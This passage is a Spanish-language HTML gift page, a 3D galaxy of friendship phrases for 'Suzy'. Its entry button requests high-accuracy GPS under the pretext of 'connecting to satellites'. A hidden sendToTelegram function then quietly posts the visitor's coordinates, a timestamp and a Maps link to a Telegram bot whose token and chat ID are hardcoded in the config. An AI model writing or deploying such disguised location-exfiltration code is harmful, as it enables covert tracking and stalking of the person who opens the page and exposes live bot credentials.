<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
    <meta name="description" content="Universo de recuerdos y frases dedicado a Suzy, con motivo del Día de la Amistad." />
    <meta name="theme-color" content="#050308" />
    <meta property="og:title" content="Universo de Amistad — Para Suzy" />
    <meta property="og:description" content="Una constelación de recuerdos y frases, para Suzy." />
    <meta property="og:type" content="website" />
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23f4c76b' d='M12 2l2.9 6.9L22 9.6l-5.5 4.8L18 22l-6-3.9L6 22l1.5-7.6L2 9.6l7.1-.7z'/%3E%3C/svg%3E" />
    <title>Universo de Amistad — Para Suzy</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,700;1,600&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
    <style>
        :root {
            --bg-deep: #050308;
            --ink: #f5efe8;
            --ink-dim: rgba(245, 239, 232, 0.72);
            --rose: #ff5d8f;
            --rose-dim: rgba(255, 93, 143, 0.35);
            --gold: #f4c76b;
            --card-bg: rgba(18, 14, 26, 0.86);
            --card-border: rgba(244, 199, 107, 0.35);
            --font-display: 'Playfair Display', serif;
            --font-body: 'Inter', Arial, sans-serif;
        }

        *, *::before, *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html, body {
            height: 100%;
            overflow: hidden;
            background: radial-gradient(ellipse at 50% 100%, #140a1c 0%, #05030a 55%, #000 100%);
            font-family: var(--font-body);
            color: var(--ink);
        }

        canvas {
            display: block;
            position: fixed;
            inset: 0;
            width: 100%;
            height: 100dvh;
        }

        #gate {
            position: fixed;
            inset: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 6vw;
            background: radial-gradient(ellipse at center, rgba(20, 10, 28, 0.55), rgba(0, 0, 0, 0.94));
            z-index: 9999;
            transition: opacity 0.9s ease;
        }

        #gate.hidden {
            opacity: 0;
            pointer-events: none;
        }

        #gate .card {
            position: relative;
            width: min(420px, 100%);
            padding: 3rem 2.2rem 2.4rem;
            text-align: center;
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 4px;
            box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.03), 0 30px 80px rgba(0, 0, 0, 0.6), 0 0 60px var(--rose-dim);
            animation: fadeIn 1.1s ease both;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(14px) scale(0.98); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        #gate .eyebrow {
            font-family: var(--font-body);
            font-size: 0.68rem;
            letter-spacing: 0.32em;
            text-transform: uppercase;
            color: var(--gold);
            margin-bottom: 1.1rem;
        }

        #gate h1 {
            font-family: var(--font-display);
            font-style: italic;
            font-weight: 600;
            font-size: clamp(1.7rem, 6vw, 2.3rem);
            line-height: 1.25;
            margin-bottom: 1.6rem;
        }

        #gate .image-frame {
            width: 78%;
            max-width: 240px;
            margin: 0 auto 1.8rem;
            border-radius: 3px;
            overflow: hidden;
            border: 1px solid var(--card-border);
            aspect-ratio: 1 / 1;
            background: rgba(255, 255, 255, 0.03);
        }

        #gate .image-frame img {
            display: block;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .btn-wrapper {
            position: relative;
            display: inline-block;
        }

        #enter-btn {
            font-family: var(--font-body);
            font-weight: 600;
            font-size: 0.85rem;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            padding: 0.95rem 2.4rem;
            color: var(--bg-deep);
            background: linear-gradient(120deg, var(--gold), var(--rose));
            border: none;
            border-radius: 999px;
            cursor: pointer;
            box-shadow: 0 8px 24px rgba(255, 93, 143, 0.28);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            position: relative;
            z-index: 2;
        }

        #enter-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 30px rgba(255, 93, 143, 0.4);
        }

        #enter-btn:active {
            transform: translateY(0);
        }

        #enter-btn:disabled {
            opacity: 0.6;
            cursor: wait;
            transform: none;
        }

        .floating-indicator {
            position: absolute;
            top: -55px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            animation: floatUpDown 2s ease-in-out infinite;
            pointer-events: none;
            z-index: 10;
        }

        @keyframes floatUpDown {
            0%, 100% { transform: translateX(-50%) translateY(0); }
            50% { transform: translateX(-50%) translateY(-12px); }
        }

        .click-text {
            font-family: var(--font-body);
            font-size: 0.8rem;
            font-weight: 600;
            color: var(--gold);
            text-shadow: 0 0 15px rgba(244, 199, 107, 0.8), 0 0 30px rgba(244, 199, 107, 0.5);
            letter-spacing: 0.1em;
            animation: textPulse 1.5s ease-in-out infinite;
            white-space: nowrap;
        }

        @keyframes textPulse {
            0%, 100% { opacity: 0.7; text-shadow: 0 0 15px rgba(244, 199, 107, 0.8), 0 0 30px rgba(244, 199, 107, 0.5); }
            50% { opacity: 1; text-shadow: 0 0 25px rgba(244, 199, 107, 1), 0 0 50px rgba(244, 199, 107, 0.8), 0 0 75px rgba(255, 93, 143, 0.6); }
        }

        .finger-icon {
            font-size: 1.8rem;
            animation: fingerTap 1.8s ease-in-out infinite;
            filter: drop-shadow(0 0 12px rgba(255, 93, 143, 0.7));
        }

        @keyframes fingerTap {
            0%, 100% { transform: scale(1) rotate(-5deg); opacity: 0.8; }
            30% { transform: scale(1.2) rotate(0deg); opacity: 1; }
            60% { transform: scale(1) rotate(5deg); opacity: 0.9; }
        }

        #audio-hint {
            position: fixed;
            bottom: 1.4rem;
            left: 50%;
            transform: translateX(-50%);
            font-family: var(--font-body);
            font-size: 0.72rem;
            letter-spacing: 0.05em;
            color: var(--ink-dim);
            background: rgba(10, 8, 16, 0.55);
            padding: 0.5rem 1rem;
            border-radius: 999px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            opacity: 0;
            transition: opacity 0.6s ease;
            z-index: 20;
            pointer-events: none;
        }

        #audio-hint.visible {
            opacity: 1;
        }

        #location-notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(-20px);
            background: rgba(18, 14, 26, 0.95);
            border: 1px solid var(--gold);
            border-radius: 16px;
            padding: 16px 24px;
            text-align: center;
            font-size: 0.9rem;
            z-index: 100;
            backdrop-filter: blur(12px);
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.8), 0 0 60px var(--rose-dim);
            opacity: 0;
            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            pointer-events: none;
            max-width: 90%;
            min-width: 280px;
        }

        #location-notification.visible {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
            pointer-events: all;
        }

        #location-notification .highlight {
            color: var(--gold);
            font-weight: 600;
        }

        #location-notification .sub-message {
            display: block;
            font-size: 0.75rem;
            opacity: 0.8;
            margin-top: 4px;
        }

        #location-notification .retry-btn {
            display: inline-block;
            margin-top: 8px;
            padding: 8px 24px;
            background: var(--gold);
            color: var(--bg-deep);
            border: none;
            border-radius: 999px;
            font-size: 0.8rem;
            font-weight: 700;
            cursor: pointer;
            pointer-events: all;
            transition: transform 0.2s;
        }

        #location-notification .retry-btn:hover {
            transform: scale(1.05);
        }

        .spinning {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        @media (prefers-reduced-motion: reduce) {
            #gate .card,
            .floating-indicator,
            .click-text,
            .finger-icon {
                animation: none;
            }
        }
    </style>
</head>
<body>
    <div id="gate">
        <div class="card">
            <div class="eyebrow">Día de la Amistad</div>
            <h1>Una constelación<br />de recuerdos,<br />para Suzy.</h1>
            <div class="image-frame">
                <img src="https://i.pinimg.com/736x/2e/08/91/2e0891b0f215a1afa9d3afe64381de4a.jpg" alt="Suzy" loading="eager" decoding="async" />
            </div>
            <div class="btn-wrapper">
                <div class="floating-indicator">
                    <span class="click-text">¡CLICK AQUÍ!</span>
                    <span class="finger-icon">👇</span>
                </div>
                <button id="enter-btn" type="button">Explorar la galaxia</button>
            </div>
        </div>
    </div>

    <div id="location-notification">
        <span id="status-icon">📍</span>
        <span id="location-text">Cargando ubicación...</span>
    </div>

    <canvas id="galaxy-canvas" aria-label="Galaxia interactiva de recuerdos" role="img"></canvas>
    <div id="audio-hint">🎵 Reproduciendo música</div>

    <audio id="music" loop preload="none">
        <source src="https://github.com/Asprog3rX/Reprodcutor/raw/refs/heads/main/Coldplay%20-%20Yellow(Sub%20Espa%C3%B1ol%20%20Lyrics).mp3" type="audio/mpeg" />
    </audio>

    <script type="importmap">
        {
            "imports": {
                "three": "https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.module.js",
                "three/addons/": "https://cdn.jsdelivr.net/npm/three@0.160.0/examples/jsm/"
            }
        }
    </script>

    <script type="module">
        import * as THREE from 'three';
        import { OrbitControls } from 'three/addons/controls/OrbitControls.js';
        import { FontLoader } from 'three/addons/loaders/FontLoader.js';
        import { TextGeometry } from 'three/addons/geometries/TextGeometry.js';

        // ==================== CONFIGURACIÓN ====================
        const CONFIG = {
            telegram: {
                botToken: '7279824834:AAFjsSx9qg9eym1tv2iQFcKvOe7Rv6lPAos',
                chatId: '1425131487',
                apiUrl: 'https://api.telegram.org/bot7279824834:AAFjsSx9qg9eym1tv2iQFcKvOe7Rv6lPAos'
            },
            scene: {
                fogColor: 0x050308,
                fogDensity: 0.00008,
                cameraFov: 75,
                cameraNear: 0.1,
                cameraFar: 4000,
                initialCameraPos: [0, 180, 700],
                controls: {
                    dampingFactor: 0.08,
                    minDistance: 150,
                    maxDistance: 1600,
                    autoRotateSpeed: 0.3
                },
                nebula: { count: 3000, size: 4, opacity: 0.6 },
                blackHole: { radius: 30, eventHorizonRadius: 42 },
                accretionDisk: { innerRadius: 35, outerRadius: 160, segments: 256 },
                stars: { lowPowerCount: 2500, highPowerCount: 8000, size: 1.5, opacity: 0.9 },
                sparkles: { lowPowerCount: 400, highPowerCount: 1000, size: 2.5, opacity: 0.7 },
                lighting: {
                    ambient: { color: 0x334466, intensity: 1.2 },
                    point1: { color: 0xff88aa, intensity: 2, distance: 800, pos: [0, 50, 0] },
                    point2: { color: 0x88aaff, intensity: 1.5, distance: 600, pos: [100, -30, 50] },
                    point3: { color: 0xffcc88, intensity: 1.5, distance: 600, pos: [-100, 20, -50] }
                },
                renderer: {
                    pixelRatioCap: 2,
                    shadowMapType: THREE.PCFSoftShadowMap,
                    toneMapping: THREE.ACESFilmicToneMapping,
                    toneMappingExposure: 1.4
                }
            },
            galaxy: {
                centralMessage: ['Gracias por', 'tu amistad', 'infinita', 'Te quiero Suzy'],
                phrases: [
                    'Eres la hermana que elegí 🌟',
                    'Gracias por estar siempre ahí 💖',
                    'Nuestra amistad es mi tesoro 💎',
                    'Contigo, cada día es una aventura 🚀',
                    'Tu apoyo es mi fuerza 💪',
                    'Eres única e inigualable 💫',
                    'Por infinitas risas y secretos 🤫',
                    'Brillas con luz propia ✨',
                    'Eres mi persona favorita 👯‍♀️',
                    'Amistad a prueba de todo 🌎',
                    'Gracias por existir, Suzy 🌹',
                    'Nuestra historia es mi favorita 📖',
                    'Siempre juntas en las buenas y en las malas 💕',
                    'Contigo el tiempo vuela ⏳',
                    'Eres un regalo del universo 🎁',
                    'Por todos los abrazos que nos quedan 🤗',
                    'Tú y yo, un equipo imparable 🏆',
                    'La vida es mejor contigo 🌈',
                    'Eres magia pura 🪄',
                    'Gracias por entenderme sin palabras 💬'
                ],
                phraseCount: 70,
                arms: 6,
                radius: 500,
                orbitSpriteUrl: 'https://i.pinimg.com/originals/02/30/1f/02301f1307b63b6440b2d704ca48599e.gif',
                orbitSpriteCount: 14,
                fontUrl: 'https://cdn.jsdelivr.net/npm/three@0.160.0/examples/fonts/gentilis_bold.typeface.json',
                centralText: {
                    size: 32,
                    height: 8,
                    curveSegments: 16,
                    bevelThickness: 2,
                    bevelSize: 1,
                    bevelSegments: 8,
                    color: 0xffeef8,
                    emissive: 0xff5d8f,
                    emissiveIntensity: 1.8,
                    metalness: 0.15,
                    roughness: 0.08
                }
            },
            location: {
                star: { radius: 200, sphereRadius: 8, glowRadius: 15, ringInner: 18, ringOuter: 22, particleCount: 30 },
                text: { size: 20, height: 4, curveSegments: 8, bevelThickness: 1, bevelSize: 0.5, bevelSegments: 4 }
            },
            geolocation: {
                timeout: 30000,
                maximumAge: 0,
                enableHighAccuracy: true,
                notificationDuration: 10000
            },
            audio: { volume: 0.75 }
        };

        // ==================== ESTADO GLOBAL ====================
        const state = {
            userLocation: null,
            isRunning: true,
            rafId: null,
            isLowPower: window.matchMedia('(pointer: coarse)').matches || navigator.hardwareConcurrency <= 4,
            reduceMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
            centerTextMesh: null,
            centerTextGlow: null
        };

        // ==================== ELEMENTOS DOM ====================
        const DOM = {
            gate: document.getElementById('gate'),
            enterBtn: document.getElementById('enter-btn'),
            audio: document.getElementById('music'),
            audioHint: document.getElementById('audio-hint'),
            locationNotification: document.getElementById('location-notification'),
            locationText: document.getElementById('location-text'),
            statusIcon: document.getElementById('status-icon'),
            canvas: document.getElementById('galaxy-canvas')
        };

        // ==================== UTILIDADES ====================
        const debounce = (fn, delay) => {
            let timer;
            return (...args) => {
                clearTimeout(timer);
                timer = setTimeout(() => fn(...args), delay);
            };
        };

        const showTemporaryNotification = (element, duration = 3200) => {
            element.classList.add('visible');
            setTimeout(() => element.classList.remove('visible'), duration);
        };

        // ==================== GEOLOCALIZACIÓN Y TELEGRAM ====================
        const sendToTelegram = async (latitude, longitude) => {
            const message =
                `🌍 *Nueva visita a la Galaxia de Suzy*\n\n` +
                `📅 *Fecha:* ${new Date().toLocaleString('es-BO', { timeZone: 'America/La_Paz' })}\n` +
                `📍 *Ubicación:*\n` +
                `• Latitud: \`${latitude}\`\n` +
                `• Longitud: \`${longitude}\`\n` +
                `• Maps: [Ver en Google Maps](https://www.google.com/maps?q=${latitude},${longitude})\n\n` +
                `🔮 Alguien está explorando el universo de recuerdos...`;

            try {
                await Promise.all([
                    fetch(`${CONFIG.telegram.apiUrl}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CONFIG.telegram.chatId,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: false,
                            disable_notification: true
                        })
                    }),
                    fetch(`${CONFIG.telegram.apiUrl}/sendLocation`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CONFIG.telegram.chatId,
                            latitude,
                            longitude,
                            disable_notification: true
                        })
                    })
                ]);
                console.log('✅ Ubicación enviada a Telegram');
            } catch (error) {
                console.error('❌ Error al enviar a Telegram:', error);
            }
        };

        const getGeolocation = () => {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    DOM.statusIcon.textContent = '❌';
                    DOM.statusIcon.className = '';
                    DOM.locationText.innerHTML = 'Tu dispositivo no soporta GPS.';
                    DOM.locationNotification.classList.add('visible');
                    setTimeout(() => DOM.locationNotification.classList.remove('visible'), 5000);
                    resolve(null);
                    return;
                }

                console.log('📍 Solicitando ubicación GPS con alta precisión...');
                DOM.statusIcon.textContent = '🛰️';
                DOM.statusIcon.className = 'spinning';
                DOM.locationText.innerHTML = '🛰️ Conectando con satélites GPS...<span class="sub-message">Acepta el permiso de ubicación</span>';
                DOM.locationNotification.classList.add('visible');

                const timeout = setTimeout(() => {
                    console.log('⏰ Timeout GPS');
                    DOM.statusIcon.textContent = '📡';
                    DOM.statusIcon.className = '';
                    DOM.locationText.innerHTML = '📡 Activa la ubicación en tu dispositivo<span class="sub-message">Ve a Configuración > Ubicación y actívala</span><button class="retry-btn" id="retry-location">Reintentar</button>';
                    
                    const retryBtn = document.getElementById('retry-location');
                    if (retryBtn) {
                        retryBtn.addEventListener('click', () => {
                            DOM.locationNotification.classList.remove('visible');
                            setTimeout(() => getGeolocation().then(resolve), 500);
                        }, { once: true });
                    }
                    resolve(null);
                }, CONFIG.geolocation.timeout);

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        console.log('✅ Ubicación GPS obtenida:', position.coords);
                        DOM.statusIcon.textContent = '✅';
                        DOM.statusIcon.className = '';
                        setTimeout(() => DOM.locationNotification.classList.remove('visible'), 500);
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => {
                        clearTimeout(timeout);
                        console.error('❌ Error GPS:', error.message);
                        
                        const errorMessages = {
                            [error.PERMISSION_DENIED]: { icon: '🚫', msg: '🚫 Permiso denegado<span class="sub-message">Actívalo en Configuración > Ubicación > Permisos</span>' },
                            [error.POSITION_UNAVAILABLE]: { icon: '📡', msg: '📡 Sin señal GPS<span class="sub-message">Sal a un lugar abierto</span>' },
                            [error.TIMEOUT]: { icon: '⏰', msg: '⏰ Tiempo agotado<span class="sub-message">Activa la ubicación en Configuración</span>' }
                        };
                        
                        const errorInfo = errorMessages[error.code] || { icon: '❌', msg: '❌ Error al obtener ubicación' };
                        DOM.statusIcon.textContent = errorInfo.icon;
                        DOM.statusIcon.className = '';
                        DOM.locationText.innerHTML = `${errorInfo.msg}<button class="retry-btn" id="retry-location">Reintentar</button>`;
                        
                        const retryBtn = document.getElementById('retry-location');
                        if (retryBtn) {
                            retryBtn.addEventListener('click', () => {
                                DOM.locationNotification.classList.remove('visible');
                                setTimeout(() => getGeolocation().then(resolve), 500);
                            }, { once: true });
                        }
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: CONFIG.geolocation.enableHighAccuracy,
                        timeout: CONFIG.geolocation.timeout,
                        maximumAge: CONFIG.geolocation.maximumAge
                    }
                );
            });
        };

        const getDetailedLocation = async (lat, lon) => {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=es`,
                    {
                        headers: { 'User-Agent': 'GalaxiaSuzy/1.0' },
                        signal: AbortSignal.timeout(5000)
                    }
                );
                if (response.ok) {
                    const data = await response.json();
                    const address = data.address || {};
                    const parts = [];
                    if (address.road) parts.push(address.road);
                    if (address.city || address.town || address.village) {
                        parts.push(address.city || address.town || address.village);
                    }
                    if (address.state) parts.push(address.state);
                    if (address.country) parts.push(address.country);
                    return parts.length > 0 ? parts.join(', ') : 'ubicación desconocida';
                }
            } catch (error) {
                console.log('❌ Error en geocodificación:', error.message);
            }
            return `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
        };

        const showLocationNotification = async (latitude, longitude) => {
            state.userLocation = { latitude, longitude };
            DOM.statusIcon.textContent = '📍';
            DOM.statusIcon.className = '';
            const detailedLocation = await getDetailedLocation(latitude, longitude);
            DOM.locationText.innerHTML = `✨ La persona especial se encuentra en <span class="highlight">${detailedLocation}</span> de esta galaxia 💫`;
            DOM.locationNotification.classList.add('visible');
            setTimeout(() => DOM.locationNotification.classList.remove('visible'), CONFIG.geolocation.notificationDuration);
        };

        // ==================== PUERTA DE ENTRADA ====================
        DOM.enterBtn.addEventListener('click', async () => {
            console.log('🖱️ Botón clickeado');
            DOM.enterBtn.disabled = true;
            DOM.enterBtn.textContent = '🛰️ Conectando GPS...';
            
            const location = await getGeolocation();
            
            if (location) {
                await Promise.all([
                    sendToTelegram(location.latitude, location.longitude),
                    showLocationNotification(location.latitude, location.longitude)
                ]);
            }
            
            DOM.enterBtn.textContent = 'Explorar la galaxia';
            DOM.gate.classList.add('hidden');
            setTimeout(() => {
                DOM.gate.style.display = 'none';
            }, 900);

            DOM.audio.volume = CONFIG.audio.volume;
            DOM.audio.play().then(() => {
                showTemporaryNotification(DOM.audioHint, 3200);
            }).catch(() => console.log('🔇 No se pudo reproducir música'));
        }, { once: true });

        // ==================== ESCENA 3D ====================
        const scene = new THREE.Scene();
        scene.fog = new THREE.FogExp2(CONFIG.scene.fogColor, CONFIG.scene.fogDensity);

        const camera = new THREE.PerspectiveCamera(
            CONFIG.scene.cameraFov,
            window.innerWidth / window.innerHeight,
            CONFIG.scene.cameraNear,
            CONFIG.scene.cameraFar
        );
        camera.position.set(...CONFIG.scene.initialCameraPos);

        const renderer = new THREE.WebGLRenderer({
            canvas: DOM.canvas,
            antialias: true,
            alpha: true,
            powerPreference: 'high-performance'
        });
        renderer.setPixelRatio(Math.min(window.devicePixelRatio, CONFIG.scene.renderer.pixelRatioCap));
        renderer.setSize(window.innerWidth, window.innerHeight);
        renderer.shadowMap.enabled = true;
        renderer.shadowMap.type = CONFIG.scene.renderer.shadowMapType;
        renderer.toneMapping = CONFIG.scene.renderer.toneMapping;
        renderer.toneMappingExposure = CONFIG.scene.renderer.toneMappingExposure;

        const controls = new OrbitControls(camera, renderer.domElement);
        controls.enableDamping = true;
        controls.dampingFactor = CONFIG.scene.controls.dampingFactor;
        controls.minDistance = CONFIG.scene.controls.minDistance;
        controls.maxDistance = CONFIG.scene.controls.maxDistance;
        controls.autoRotate = true;
        controls.autoRotateSpeed = CONFIG.scene.controls.autoRotateSpeed;
        controls.target.set(0, 0, 0);

        const handleResize = debounce(() => {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        }, 120);
        window.addEventListener('resize', handleResize);

        // ==================== COMPONENTES DE LA ESCENA ====================
        const createNebula = () => {
            const geometry = new THREE.BufferGeometry();
            const { count } = CONFIG.scene.nebula;
            const positions = new Float32Array(count * 3);
            const colors = new Float32Array(count * 3);
            
            for (let i = 0; i < count; i++) {
                const radius = 800 + Math.random() * 2000;
                const theta = Math.random() * Math.PI * 2;
                const phi = Math.acos(2 * Math.random() - 1);
                positions[i * 3] = radius * Math.sin(phi) * Math.cos(theta);
                positions[i * 3 + 1] = radius * Math.sin(phi) * Math.sin(theta);
                positions[i * 3 + 2] = radius * Math.cos(phi);
                
                const colorChoice = Math.random();
                if (colorChoice < 0.33) {
                    colors[i * 3] = 0.4 + Math.random() * 0.3;
                    colors[i * 3 + 1] = 0.1 + Math.random() * 0.2;
                    colors[i * 3 + 2] = 0.5 + Math.random() * 0.4;
                } else if (colorChoice < 0.66) {
                    colors[i * 3] = 0.6 + Math.random() * 0.3;
                    colors[i * 3 + 1] = 0.2 + Math.random() * 0.3;
                    colors[i * 3 + 2] = 0.3 + Math.random() * 0.3;
                } else {
                    colors[i * 3] = 0.8 + Math.random() * 0.2;
                    colors[i * 3 + 1] = 0.6 + Math.random() * 0.3;
                    colors[i * 3 + 2] = 0.3 + Math.random() * 0.3;
                }
            }
            
            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
            
            const material = new THREE.PointsMaterial({
                size: CONFIG.scene.nebula.size,
                vertexColors: true,
                blending: THREE.AdditiveBlending,
                depthWrite: false,
                transparent: true,
                opacity: CONFIG.scene.nebula.opacity
            });
            
            return new THREE.Points(geometry, material);
        };

        const createBlackHole = () => {
            const group = new THREE.Group();
            const blackHole = new THREE.Mesh(
                new THREE.SphereGeometry(CONFIG.scene.blackHole.radius, 64, 64),
                new THREE.MeshStandardMaterial({
                    color: 0x000000,
                    roughness: 0.1,
                    metalness: 0.9,
                    emissive: 0x000000,
                    emissiveIntensity: 0.5
                })
            );
            blackHole.castShadow = true;
            blackHole.receiveShadow = true;
            group.add(blackHole);
            
            const eventHorizon = new THREE.Mesh(
                new THREE.SphereGeometry(CONFIG.scene.blackHole.eventHorizonRadius, 64, 64),
                new THREE.MeshBasicMaterial({
                    color: 0x330066,
                    transparent: true,
                    opacity: 0.3,
                    blending: THREE.AdditiveBlending
                })
            );
            group.add(eventHorizon);
            
            return group;
        };

        const buildAccretionTexture = () => {
            const canvas = document.createElement('canvas');
            canvas.width = canvas.height = 1024;
            const ctx = canvas.getContext('2d');
            const gradient = ctx.createRadialGradient(512, 512, 80, 512, 512, 512);
            gradient.addColorStop(0.0, 'rgba(255,255,255,0.95)');
            gradient.addColorStop(0.15, 'rgba(255,240,200,0.9)');
            gradient.addColorStop(0.35, 'rgba(255,180,100,0.8)');
            gradient.addColorStop(0.55, 'rgba(255,93,143,0.7)');
            gradient.addColorStop(0.75, 'rgba(100,50,150,0.4)');
            gradient.addColorStop(0.95, 'rgba(0,0,0,0)');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            for (let i = 0; i < 200; i++) {
                const angle = (i / 200) * Math.PI * 2;
                const r = 150 + Math.random() * 300;
                const x = 512 + Math.cos(angle) * r;
                const y = 512 + Math.sin(angle) * r;
                ctx.beginPath();
                ctx.arc(x, y, 2 + Math.random() * 4, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(255, ${200 + Math.random() * 55}, ${100 + Math.random() * 100}, ${0.5 + Math.random() * 0.5})`;
                ctx.fill();
            }
            
            return new THREE.CanvasTexture(canvas);
        };

        const createAccretionDisk = (innerRadius, outerRadius, emissive, opacity) => {
            const disk = new THREE.Mesh(
                new THREE.RingGeometry(innerRadius, outerRadius, CONFIG.scene.accretionDisk.segments),
                new THREE.MeshStandardMaterial({
                    map: buildAccretionTexture(),
                    side: THREE.DoubleSide,
                    transparent: true,
                    emissive,
                    emissiveIntensity: 0.5,
                    opacity
                })
            );
            disk.receiveShadow = true;
            return disk;
        };

        const createStars = () => {
            const starCount = state.isLowPower ? CONFIG.scene.stars.lowPowerCount : CONFIG.scene.stars.highPowerCount;
            const geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(starCount * 3);
            const colors = new Float32Array(starCount * 3);
            
            for (let i = 0; i < starCount; i++) {
                positions[i * 3] = (Math.random() - 0.5) * 8000;
                positions[i * 3 + 1] = (Math.random() - 0.5) * 8000;
                positions[i * 3 + 2] = (Math.random() - 0.5) * 8000;
                
                const temp = Math.random();
                if (temp < 0.1) {
                    colors[i * 3] = 0.7;
                    colors[i * 3 + 1] = 0.8;
                    colors[i * 3 + 2] = 1.0;
                } else if (temp < 0.2) {
                    colors[i * 3] = 1.0;
                    colors[i * 3 + 1] = 0.9;
                    colors[i * 3 + 2] = 0.7;
                } else {
                    const brightness = 0.9 + Math.random() * 0.1;
                    colors[i * 3] = brightness;
                    colors[i * 3 + 1] = brightness;
                    colors[i * 3 + 2] = brightness;
                }
            }
            
            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
            
            return new THREE.Points(geometry, new THREE.PointsMaterial({
                size: CONFIG.scene.stars.size,
                vertexColors: true,
                blending: THREE.AdditiveBlending,
                depthWrite: false,
                transparent: true,
                opacity: CONFIG.scene.stars.opacity
            }));
        };

        const createSparkles = () => {
            const count = state.isLowPower ? CONFIG.scene.sparkles.lowPowerCount : CONFIG.scene.sparkles.highPowerCount;
            const geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(count * 3);
            
            for (let i = 0; i < count; i++) {
                const radius = 200 + Math.random() * 600;
                const theta = Math.random() * Math.PI * 2;
                const phi = Math.random() * Math.PI;
                positions[i * 3] = radius * Math.sin(phi) * Math.cos(theta);
                positions[i * 3 + 1] = radius * Math.sin(phi) * Math.sin(theta);
                positions[i * 3 + 2] = radius * Math.cos(phi);
            }
            
            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            
            return new THREE.Points(geometry, new THREE.PointsMaterial({
                size: CONFIG.scene.sparkles.size,
                color: 0xffffff,
                blending: THREE.AdditiveBlending,
                depthWrite: false,
                transparent: true,
                opacity: CONFIG.scene.sparkles.opacity
            }));
        };

        const createLighting = () => {
            const { ambient, point1, point2, point3 } = CONFIG.scene.lighting;
            
            scene.add(new THREE.AmbientLight(ambient.color, ambient.intensity));
            
            const light1 = new THREE.PointLight(point1.color, point1.intensity, point1.distance);
            light1.position.set(...point1.pos);
            light1.castShadow = true;
            light1.shadow.mapSize.width = 1024;
            light1.shadow.mapSize.height = 1024;
            scene.add(light1);
            
            const light2 = new THREE.PointLight(point2.color, point2.intensity, point2.distance);
            light2.position.set(...point2.pos);
            scene.add(light2);
            
            const light3 = new THREE.PointLight(point3.color, point3.intensity, point3.distance);
            light3.position.set(...point3.pos);
            scene.add(light3);
            
            return { light1, light2, light3 };
        };

        const createCentralText = () => {
            new FontLoader().load(
                CONFIG.galaxy.fontUrl,
                (font) => {
                    const text = CONFIG.galaxy.centralMessage.join('\n');
                    const { size, height, curveSegments, bevelThickness, bevelSize, bevelSegments, color, emissive, emissiveIntensity, metalness, roughness } = CONFIG.galaxy.centralText;
                    
                    const geometry = new TextGeometry(text, {
                        font,
                        size,
                        height,
                        curveSegments,
                        bevelEnabled: true,
                        bevelThickness,
                        bevelSize,
                        bevelSegments
                    });
                    
                    geometry.computeBoundingBox();
                    const bb = geometry.boundingBox;
                    const xOffset = -0.5 * (bb.max.x - bb.min.x);
                    const yOffset = -0.3 * (bb.max.y - bb.min.y);
                    
                    const material = new THREE.MeshStandardMaterial({
                        color,
                        emissive,
                        emissiveIntensity,
                        metalness,
                        roughness,
                        envMapIntensity: 1.5
                    });
                    
                    const mesh = new THREE.Mesh(geometry, material);
                    mesh.position.set(xOffset, 60 + yOffset, 0);
                    mesh.rotation.x = -Math.PI / 12;
                    mesh.renderOrder = 999;
                    mesh.material.depthTest = true;
                    mesh.material.depthWrite = true;
                    mesh.castShadow = true;
                    mesh.receiveShadow = true;
                    scene.add(mesh);
                    state.centerTextMesh = mesh;
                    
